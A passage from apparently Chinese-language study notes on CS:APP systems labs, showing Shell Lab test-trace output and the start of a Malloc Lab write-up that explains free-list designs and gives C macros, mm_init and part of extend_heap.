</span><span id=__span-153-38><a id=__codelineno-153-38 name=__codelineno-153-38></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743488</span><span class=o>)</span><span class=w> </span>Running<span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-153-39><a id=__codelineno-153-39 name=__codelineno-153-39></a><span class=m>07</span>-Shell-Lab$<span class=w> </span>make<span class=w> </span>rtest14
</span><span id=__span-153-40><a id=__codelineno-153-40 name=__codelineno-153-40></a>./sdriver.pl<span class=w> </span>-t<span class=w> </span>trace14.txt<span class=w> </span>-s<span class=w> </span>./tshref<span class=w> </span>-a<span class=w> </span><span class=s2>"-p"</span>
</span><span id=__span-153-41><a id=__codelineno-153-41 name=__codelineno-153-41></a><span class=c1>#</span>
</span><span id=__span-153-42><a id=__codelineno-153-42 name=__codelineno-153-42></a><span class=c1># trace14.txt - Simple error handling</span>
</span><span id=__span-153-43><a id=__codelineno-153-43 name=__codelineno-153-43></a><span class=c1>#</span>
</span><span id=__span-153-44><a id=__codelineno-153-44 name=__codelineno-153-44></a>tsh&gt;<span class=w> </span>./bogus
</span><span id=__span-153-45><a id=__codelineno-153-45 name=__codelineno-153-45></a>./bogus:<span class=w> </span>Command<span class=w> </span>not<span class=w> </span>found
</span><span id=__span-153-46><a id=__codelineno-153-46 name=__codelineno-153-46></a>tsh&gt;<span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-153-47><a id=__codelineno-153-47 name=__codelineno-153-47></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743685</span><span class=o>)</span><span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-153-48><a id=__codelineno-153-48 name=__codelineno-153-48></a>tsh&gt;<span class=w> </span><span class=nb>fg</span>
</span><span id=__span-153-49><a id=__codelineno-153-49 name=__codelineno-153-49></a><span class=nb>fg</span><span class=w> </span><span class=nb>command</span><span class=w> </span>requires<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid<span class=w> </span>argument
</span><span id=__span-153-50><a id=__codelineno-153-50 name=__codelineno-153-50></a>tsh&gt;<span class=w> </span><span class=nb>bg</span>
</span><span id=__span-153-51><a id=__codelineno-153-51 name=__codelineno-153-51></a><span class=nb>bg</span><span class=w> </span><span class=nb>command</span><span class=w> </span>requires<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid<span class=w> </span>argument
</span><span id=__span-153-52><a id=__codelineno-153-52 name=__codelineno-153-52></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>a
</span><span id=__span-153-53><a id=__codelineno-153-53 name=__codelineno-153-53></a>fg:<span class=w> </span>argument<span class=w> </span>must<span class=w> </span>be<span class=w> </span>a<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid
</span><span id=__span-153-54><a id=__codelineno-153-54 name=__codelineno-153-54></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>a
</span><span id=__span-153-55><a id=__codelineno-153-55 name=__codelineno-153-55></a>bg:<span class=w> </span>argument<span class=w> </span>must<span class=w> </span>be<span class=w> </span>a<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid
</span><span id=__span-153-56><a id=__codelineno-153-56 name=__codelineno-153-56></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span><span class=m>9999999</span>
</span><span id=__span-153-57><a id=__codelineno-153-57 name=__codelineno-153-57></a><span class=o>(</span><span class=m>9999999</span><span class=o>)</span>:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>process
</span><span id=__span-153-58><a id=__codelineno-153-58 name=__codelineno-153-58></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span><span class=m>9999999</span>
</span><span id=__span-153-59><a id=__codelineno-153-59 name=__codelineno-153-59></a><span class=o>(</span><span class=m>9999999</span><span class=o>)</span>:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>process
</span><span id=__span-153-60><a id=__codelineno-153-60 name=__codelineno-153-60></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>%2
</span><span id=__span-153-61><a id=__codelineno-153-61 name=__codelineno-153-61></a>%2:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>job
</span><span id=__span-153-62><a id=__codelineno-153-62 name=__codelineno-153-62></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>%1
</span><span id=__span-153-63><a id=__codelineno-153-63 name=__codelineno-153-63></a>Job<span class=w> </span><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743685</span><span class=o>)</span><span class=w> </span>stopped<span class=w> </span>by<span class=w> </span>signal<span class=w> </span><span class=m>20</span>
</span><span id=__span-153-64><a id=__codelineno-153-64 name=__codelineno-153-64></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>%2
</span><span id=__span-153-65><a id=__codelineno-153-65 name=__codelineno-153-65></a>%2:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>job
</span><span id=__span-153-66><a id=__codelineno-153-66 name=__codelineno-153-66></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>%1
</span><span id=__span-153-67><a id=__codelineno-153-67 name=__codelineno-153-67></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743685</span><span class=o>)</span><span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-153-68><a id=__codelineno-153-68 name=__codelineno-153-68></a>tsh&gt;<span class=w> </span><span class=nb>jobs</span>
</span><span id=__span-153-69><a id=__codelineno-153-69 name=__codelineno-153-69></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>743685</span><span class=o>)</span><span class=w> </span>Running<span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span></code></pre></div></td></tr></table></div> </li> </ol> <h2 id=malloc-lab>Malloc Lab<a class=headerlink href=#malloc-lab title="Permanent link">¶</a></h2> <ol> <li> <h3 id=_14>实验概览<a class=headerlink href=#_14 title="Permanent link">¶</a></h3> <p>Malloc Lab 要求用 C 语言编写一个动态存储分配器 (修改 <code>mm.c</code>)，即实现:</p> <ul> <li><code>mm_init</code>: 初始化分配器</li> <li><code>malloc</code>: 分配内存</li> <li><code>free</code>: 释放内存</li> <li><code>realloc</code>: 重新分配内存</li> <li><code>calloc</code>: 分配并初始化内存为 0</li> <li><code>mm_checkheap</code>: 检查堆的正确性</li> </ul> <p>用如下命令测试：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-154-1>1</a></span>
<span class=normal><a href=#__codelineno-154-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-154-1><a id=__codelineno-154-1 name=__codelineno-154-1></a><span class=m>08</span>-Malloc-Lab$<span class=w> </span>make<span class=w> </span>clean<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span>mdriver
</span><span id=__span-154-2><a id=__codelineno-154-2 name=__codelineno-154-2></a><span class=m>08</span>-Malloc-Lab$<span class=w> </span>./mdriver<span class=w> </span>-t<span class=w> </span>./traces<span class=w> </span>-V
</span></code></pre></div></td></tr></table></div> <p>性能表现主要考虑两点：</p> <ul> <li>util 空间利用率：<code>mm_malloc</code> 或 <code>mm_realloc</code> 函数分配且未被 <code>mm_free</code> 释放的内存与堆的大小的比值。应该找到好的策略使碎片最小化，以使该比率尽可能接近 1</li> <li>thru 吞吐率：每单位时间完成的最大请求数，即要使时间复杂度尽可能小</li> </ul> </li> <li> <h3 id=_15>实现思路<a class=headerlink href=#_15 title="Permanent link">¶</a></h3> <p>动态内存分配器维护着一个进程的虚拟内存区域，称为堆。如图：</p> <p><img alt="alt text" src=../../img/image-106.png width=360></p> <p>分配器将堆视为一组大小不同的块的集合来维护，且它们的地址是连续的。将块标记为两种，已分配的块供应用程序使用，空闲块用来分配。怎样来组织这些块呢？课本为我们提供了三种实现方式：</p> <ul> <li>Implicit Free List：把所有块连接起来，每次分配时从头到尾扫描合适的空闲块，在实验的第一部分实现了这个做法</li> <li> <p>Explicit Free Lists：它是 Implicit Free List 的进一步优化，在所有空闲块中记录两个指针，分别指向前一个空闲块和后一个空闲块，相当于在链表中又嵌套了一个链表，这样分配的时候就不需要遍历已分配块了，将分配时间从块总数的线性时间缩短为空闲块数量的线性时间</p> <p><img alt="alt text" src=../../img/image-107.png></p> </li> <li> <p>Segregated Free Lists：维护多个空闲链表，每个链表中的块有大致相等的大小，分配器维护着一个空闲链表数组，每个大小类有一个空闲链表，当需要分配块时只需要在对应的空闲链表中搜索就好了，书上描述了两种分离存储的方法：</p> <ul> <li>Simple Segregated Storage：从不合并与分离，每个块的大小就是大小类中最大元素的大小。例如大小类为 {17~32}，则需要分配块的大小在这个区间时均在此对应链表进行分配，并且都是分配大小为 32 的块。这样做，显然分配和释放都是常数级的，但是空间利用率较低</li> <li>Segregated Fit：每个大小类的空闲链表包含大小不同的块，分配完一个块后，将这个块进行分割，并根据剩下的块的大小将其插入到适当大小类的空闲链表中。这个做法平衡了搜索时间与空间利用率，C 标准库提供的 GNU malloc 包就是采用的这种方法。在实验的第二部分实现了这个做法。</li> </ul> </li> </ul> </li> <li> <h3 id=implicit-free-list>Implicit Free List 实现<a class=headerlink href=#implicit-free-list title="Permanent link">¶</a></h3> <p>要想分数尽可能高，我们需要使吞吐率尽可能高，空间利用率尽可能好。如果从不重复利用任何块，函数的吞吐率会非常好，而空间利用率会很差；而若进行空闲块的分割合并等操作又会影响吞吐率，因而，就要设计合适的数据结构与算法来平衡两者的关系。</p> <ul> <li>空闲块组织：利用隐式空闲链表记录空闲块</li> <li>放置策略：如何选择合适的空闲块分配？<ul> <li>首次适配：从头开始搜索空闲链表，选择第一个合适的空闲块</li> <li>下一次适配：从上一次查询结束的地方开始搜索选择第一个合适的空闲块</li> <li>最佳适配：搜索能放下请求大小的最小空闲块</li> </ul> </li> <li>分割：在将一个新分配的块放置到某个空闲块后，剩余的部分要进行处理</li> <li>合并：释放某个块后，要让它与相邻的空闲块合并</li> </ul> <p>无论用什么策略，放置的时间复杂度都为 O(n)，性能很差。</p> </li> <li> <h4 id=_16>空闲块组织<a class=headerlink href=#_16 title="Permanent link">¶</a></h4> <p>每个空闲块的结构如下：</p> <p><img alt="alt text" src=../../img/image-108.png width=400></p> <ul> <li>脚部与头部是相同的，均为 4 个字节，用来存储块的大小，以及表明这个块是已分配还是空闲块</li> <li>由于要求块双字对齐，所以块大小就总是 8 的倍数，低 3 位总是为 0，因而，我们只需要利用头部和脚部的高 29 位存储块的大小，剩下 3 位的最低位来指明这个块是否空闲，000 为空闲，001 为已分配</li> </ul> <p>为什么既设置头部又设置尾部呢？这是为了能够以常数时间来进行块的合并。无论是与下一块还是与上一块合并，都可以通过他们的头部或尾部得知块大小，从而定位整个块，避免了从头遍历链表。</p> <p>空闲块怎么组织呢？如图：</p> <p><img alt="alt text" src=../../img/image-109.png></p> <p>堆有两个特殊的标记：</p> <ul> <li>序言块：8 个字节，由一个头部和一个脚部组成</li> <li>结尾块：大小为 0 的头部</li> </ul> <p>为了消除合并空闲块时边界的考虑，将序言块和结尾块的分配位均设置为已分配。为了保证双字对齐，在序言块的前面还设置了 4 个字节作为填充。</p> <p>根据上述结构，可以定义一些方便操作的宏：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-155-1> 1</a></span>
<span class=normal><a href=#__codelineno-155-2> 2</a></span>
<span class=normal><a href=#__codelineno-155-3> 3</a></span>
<span class=normal><a href=#__codelineno-155-4> 4</a></span>
<span class=normal><a href=#__codelineno-155-5> 5</a></span>
<span class=normal><a href=#__codelineno-155-6> 6</a></span>
<span class=normal><a href=#__codelineno-155-7> 7</a></span>
<span class=normal><a href=#__codelineno-155-8> 8</a></span>
<span class=normal><a href=#__codelineno-155-9> 9</a></span>
<span class=normal><a href=#__codelineno-155-10>10</a></span>
<span class=normal><a href=#__codelineno-155-11>11</a></span>
<span class=normal><a href=#__codelineno-155-12>12</a></span>
<span class=normal><a href=#__codelineno-155-13>13</a></span>
<span class=normal><a href=#__codelineno-155-14>14</a></span>
<span class=normal><a href=#__codelineno-155-15>15</a></span>
<span class=normal><a href=#__codelineno-155-16>16</a></span>
<span class=normal><a href=#__codelineno-155-17>17</a></span>
<span class=normal><a href=#__codelineno-155-18>18</a></span>
<span class=normal><a href=#__codelineno-155-19>19</a></span>
<span class=normal><a href=#__codelineno-155-20>20</a></span>
<span class=normal><a href=#__codelineno-155-21>21</a></span>
<span class=normal><a href=#__codelineno-155-22>22</a></span>
<span class=normal><a href=#__codelineno-155-23>23</a></span>
<span class=normal><a href=#__codelineno-155-24>24</a></span>
<span class=normal><a href=#__codelineno-155-25>25</a></span>
<span class=normal><a href=#__codelineno-155-26>26</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-155-1><a id=__codelineno-155-1 name=__codelineno-155-1></a><span class=cm>/* 头部/脚部的大小 */</span>
</span><span id=__span-155-2><a id=__codelineno-155-2 name=__codelineno-155-2></a><span class=cp>#define WSIZE 4</span>
</span><span id=__span-155-3><a id=__codelineno-155-3 name=__codelineno-155-3></a><span class=cm>/* 双字 */</span>
</span><span id=__span-155-4><a id=__codelineno-155-4 name=__codelineno-155-4></a><span class=cp>#define DSIZE 8</span>
</span><span id=__span-155-5><a id=__codelineno-155-5 name=__codelineno-155-5></a>
</span><span id=__span-155-6><a id=__codelineno-155-6 name=__codelineno-155-6></a><span class=cm>/* 扩展堆时的默认大小 */</span>
</span><span id=__span-155-7><a id=__codelineno-155-7 name=__codelineno-155-7></a><span class=cp>#define CHUNKSIZE (1 &lt;&lt; 12)</span>
</span><span id=__span-155-8><a id=__codelineno-155-8 name=__codelineno-155-8></a>
</span><span id=__span-155-9><a id=__codelineno-155-9 name=__codelineno-155-9></a><span class=cm>/* 设置头部和脚部的值, 块大小+分配位 */</span>
</span><span id=__span-155-10><a id=__codelineno-155-10 name=__codelineno-155-10></a><span class=cp>#define PACK(size, alloc) ((size) | (alloc))</span>
</span><span id=__span-155-11><a id=__codelineno-155-11 name=__codelineno-155-11></a>
</span><span id=__span-155-12><a id=__codelineno-155-12 name=__codelineno-155-12></a><span class=cm>/* 读写指针p的位置 */</span>
</span><span id=__span-155-13><a id=__codelineno-155-13 name=__codelineno-155-13></a><span class=cp>#define GET(p) (*(unsigned int *)(p))</span>
</span><span id=__span-155-14><a id=__codelineno-155-14 name=__codelineno-155-14></a><span class=cp>#define PUT(p, val) ((*(unsigned int *)(p)) = (val))</span>
</span><span id=__span-155-15><a id=__codelineno-155-15 name=__codelineno-155-15></a>
</span><span id=__span-155-16><a id=__codelineno-155-16 name=__codelineno-155-16></a><span class=cm>/* 从头部或脚部获取大小或分配位 */</span>
</span><span id=__span-155-17><a id=__codelineno-155-17 name=__codelineno-155-17></a><span class=cp>#define GET_SIZE(p) (GET(p) &amp; ~0x7)</span>
</span><span id=__span-155-18><a id=__codelineno-155-18 name=__codelineno-155-18></a><span class=cp>#define GET_ALLOC(p) (GET(p) &amp; 0x1)</span>
</span><span id=__span-155-19><a id=__codelineno-155-19 name=__codelineno-155-19></a>
</span><span id=__span-155-20><a id=__codelineno-155-20 name=__codelineno-155-20></a><span class=cm>/* 给定有效载荷指针, 找到头部和脚部 */</span>
</span><span id=__span-155-21><a id=__codelineno-155-21 name=__codelineno-155-21></a><span class=cp>#define HDRP(bp) ((char*)(bp) - WSIZE)</span>
</span><span id=__span-155-22><a id=__codelineno-155-22 name=__codelineno-155-22></a><span class=cp>#define FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span>
</span><span id=__span-155-23><a id=__codelineno-155-23 name=__codelineno-155-23></a>
</span><span id=__span-155-24><a id=__codelineno-155-24 name=__codelineno-155-24></a><span class=cm>/* 给定有效载荷指针, 找到前一块或下一块 */</span>
</span><span id=__span-155-25><a id=__codelineno-155-25 name=__codelineno-155-25></a><span class=cp>#define NEXT_BLKP(bp) ((char*)(bp) + GET_SIZE(((char*)(bp) - WSIZE)))</span>
</span><span id=__span-155-26><a id=__codelineno-155-26 name=__codelineno-155-26></a><span class=cp>#define PREV_BLKP(bp) ((char*)(bp) - GET_SIZE(((char*)(bp) - DSIZE)))</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h4 id=_17>合并与分割<a class=headerlink href=#_17 title="Permanent link">¶</a></h4> <p>先初始化堆:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-156-1> 1</a></span>
<span class=normal><a href=#__codelineno-156-2> 2</a></span>
<span class=normal><a href=#__codelineno-156-3> 3</a></span>
<span class=normal><a href=#__codelineno-156-4> 4</a></span>
<span class=normal><a href=#__codelineno-156-5> 5</a></span>
<span class=normal><a href=#__codelineno-156-6> 6</a></span>
<span class=normal><a href=#__codelineno-156-7> 7</a></span>
<span class=normal><a href=#__codelineno-156-8> 8</a></span>
<span class=normal><a href=#__codelineno-156-9> 9</a></span>
<span class=normal><a href=#__codelineno-156-10>10</a></span>
<span class=normal><a href=#__codelineno-156-11>11</a></span>
<span class=normal><a href=#__codelineno-156-12>12</a></span>
<span class=normal><a href=#__codelineno-156-13>13</a></span>
<span class=normal><a href=#__codelineno-156-14>14</a></span>
<span class=normal><a href=#__codelineno-156-15>15</a></span>
<span class=normal><a href=#__codelineno-156-16>16</a></span>
<span class=normal><a href=#__codelineno-156-17>17</a></span>
<span class=normal><a href=#__codelineno-156-18>18</a></span>
<span class=normal><a href=#__codelineno-156-19>19</a></span>
<span class=normal><a href=#__codelineno-156-20>20</a></span>
<span class=normal><a href=#__codelineno-156-21>21</a></span>
<span class=normal><a href=#__codelineno-156-22>22</a></span>
<span class=normal><a href=#__codelineno-156-23>23</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-156-1><a id=__codelineno-156-1 name=__codelineno-156-1></a><span class=cm>/* </span>
</span><span id=__span-156-2><a id=__codelineno-156-2 name=__codelineno-156-2></a><span class=cm>* mm_init - initialize the malloc package.</span>
</span><span id=__span-156-3><a id=__codelineno-156-3 name=__codelineno-156-3></a><span class=cm>*/</span>
</span><span id=__span-156-4><a id=__codelineno-156-4 name=__codelineno-156-4></a><span class=kt>int</span><span class=w> </span><span class=nf>mm_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-156-5><a id=__codelineno-156-5 name=__codelineno-156-5></a><span class=p>{</span>
</span><span id=__span-156-6><a id=__codelineno-156-6 name=__codelineno-156-6></a><span class=w>    </span><span class=cm>/* 申请16个字节空间: 4个单字，一个单字是4字节，一个双字是8字节 */</span>
</span><span id=__span-156-7><a id=__codelineno-156-7 name=__codelineno-156-7></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>heap_list</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>mem_sbrk</span><span class=p>(</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>))</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=mi>-1</span><span class=p>)</span>
</span><span id=__span-156-8><a id=__codelineno-156-8 name=__codelineno-156-8></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
</span><span id=__span-156-9><a id=__codelineno-156-9 name=__codelineno-156-9></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>                                </span><span class=cm>/* 对齐 */</span>
</span><span id=__span-156-10><a id=__codelineno-156-10 name=__codelineno-156-10></a><span class=w>    </span><span class=cm>/* </span>
</span><span id=__span-156-11><a id=__codelineno-156-11 name=__codelineno-156-11></a><span class=cm>    * 序言块和结尾块均设置为已分配, 方便考虑边界情况</span>
</span><span id=__span-156-12><a id=__codelineno-156-12 name=__codelineno-156-12></a><span class=cm>    */</span>
</span><span id=__span-156-13><a id=__codelineno-156-13 name=__codelineno-156-13></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>DSIZE</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>     </span><span class=cm>/* 填充序言块 */</span>
</span><span id=__span-156-14><a id=__codelineno-156-14 name=__codelineno-156-14></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>DSIZE</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>     </span><span class=cm>/* 填充序言块 */</span>
</span><span id=__span-156-15><a id=__codelineno-156-15 name=__codelineno-156-15></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=mi>3</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>         </span><span class=cm>/* 结尾块 */</span>
</span><span id=__span-156-16><a id=__codelineno-156-16 name=__codelineno-156-16></a>
</span><span id=__span-156-17><a id=__codelineno-156-17 name=__codelineno-156-17></a><span class=w>    </span><span class=n>heap_list</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=p>(</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>);</span>
</span><span id=__span-156-18><a id=__codelineno-156-18 name=__codelineno-156-18></a>
</span><span id=__span-156-19><a id=__codelineno-156-19 name=__codelineno-156-19></a><span class=w>    </span><span class=cm>/* 扩展空闲空间 */</span>
</span><span id=__span-156-20><a id=__codelineno-156-20 name=__codelineno-156-20></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>extend_heap</span><span class=p>(</span><span class=n>CHUNKSIZE</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>WSIZE</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-156-21><a id=__codelineno-156-21 name=__codelineno-156-21></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
</span><span id=__span-156-22><a id=__codelineno-156-22 name=__codelineno-156-22></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-156-23><a id=__codelineno-156-23 name=__codelineno-156-23></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>重点在扩展堆:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-157-1> 1</a></span>
<span class=normal><a href=#__codelineno-157-2> 2</a></span>
<span class=normal><a href=#__codelineno-157-3> 3</a></span>
<span class=normal><a href=#__codelineno-157-4> 4</a></span>
<span class=normal><a href=#__codelineno-157-5> 5</a></span>
<span class=normal><a href=#__codelineno-157-6> 6</a></span>
<span class=normal><a href=#__codelineno-157-7> 7</a></span>
<span class=normal><a href=#__codelineno-157-8> 8</a></span>
<span class=normal><a href=#__codelineno-157-9> 9</a></span>
<span class=normal><a href=#__codelineno-157-10>10</a></span>
<span class=normal><a href=#__codelineno-157-11>11</a></span>
<span class=normal><a href=#__codelineno-157-12>12</a></span>
<span class=normal><a href=#__codelineno-157-13>13</a></span>
<span class=normal><a href=#__codelineno-157-14>14</a></span>
<span class=normal><a href=#__codelineno-157-15>15</a></span>
<span class=normal><a href=#__codelineno-157-16>16</a></span>
<span class=normal><a href=#__codelineno-157-17>17</a></span>
<span class=normal><a href=#__codelineno-157-18>18</a></span>
<span class=normal><a href=#__codelineno-157-19>19</a></span>
<span class=normal><a href=#__codelineno-157-20>20</a></span>
<span class=normal><a href=#__codelineno-157-21>21</a></span>
<span class=normal><a href=#__codelineno-157-22>22</a></span>
<span class=normal><a href=#__codelineno-157-23>23</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-157-1><a id=__codelineno-157-1 name=__codelineno-157-1></a><span class=cm>/*</span>
</span><span id=__span-157-2><a id=__codelineno-157-2 name=__codelineno-157-2></a><span class=cm>* 扩展heap, 传入的是字数(一个字是4字节)</span>
</span><span id=__span-157-3><a id=__codelineno-157-3 name=__codelineno-157-3></a><span class=cm>*/</span>
</span><span id=__span-157-4><a id=__codelineno-157-4 name=__codelineno-157-4></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>extend_heap</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>words</span><span class=p>)</span>
</span><span id=__span-157-5><a id=__codelineno-157-5 name=__codelineno-157-5></a><span class=p>{</span>
</span><span id=__span-157-6><a id=__codelineno-157-6 name=__codelineno-157-6></a><span class=w>    </span><span class=cm>/* bp总是指向有效载荷 */</span>
</span><span id=__span-157-7><a id=__codelineno-157-7 name=__codelineno-157-7></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-157-8><a id=__codelineno-157-8 name=__codelineno-157-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=p>;</span>
</span><span id=__span-157-9><a id=__codelineno-157-9 name=__codelineno-157-9></a><span class=w>    </span><span class=cm>/* 根据传入字数奇偶, 考虑对齐，转换成字节数(总是8的倍数) */</span>
</span><span id=__span-157-10><a id=__codelineno-157-10 name=__codelineno-157-10></a><span class=w>    </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>words</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=p>(</span><span class=n>words</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=w> </span><span class=o>:</span><span class=w> </span><span class=n>words</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>WSIZE</span><span class=p>;</span>
</span><span id=__span-157-11><a id=__codelineno-157-11 name=__codelineno-157-11></a>
</span><span id=__span-157-12><a id=__codelineno-157-12 name=__codelineno-157-12></a><span class=w>    </span><span class=cm>/* 分配 */</span>
</span><span id=__span-157-13><a id=__codelineno-157-13 name=__codelineno-157-13></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>mem_sbrk</span><span class=p>(</span><span class=n>size</span><span class=p>))</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span>
</span><span id=__span-157-14><a id=__codelineno-157-14 name=__codelineno-157-14></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
</span><span id=__span-157-15><a id=__codelineno-157-15 name=__codelineno-157-15></a>
</span><span id=__span-157-16><a id=__codelineno-157-16 name=__codelineno-157-16></a><span class=w>    </span><span class=cm>/* 设置头部和脚部 */</span>
</span><span id=__span-157-17><a id=__codelineno-157-17 name=__codelineno-157-17></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=cm>/* 空闲块头 */</span>
</span><span id=__span-157-18><a id=__codelineno-157-18 name=__codelineno-157-18></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=cm>/* 空闲块脚 */</span>
</span><span id=__span-157-19><a id=__codelineno-157-19 name=__codelineno-157-19></a><span class=w>    </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span><span class=w>   </span><span class=cm>/* 新结尾块，帮助内存分配器识别堆的结束位置 */</span>
</span><span id=__span-157-20><a id=__codelineno-157-20 name=__codelineno-157-20></a>
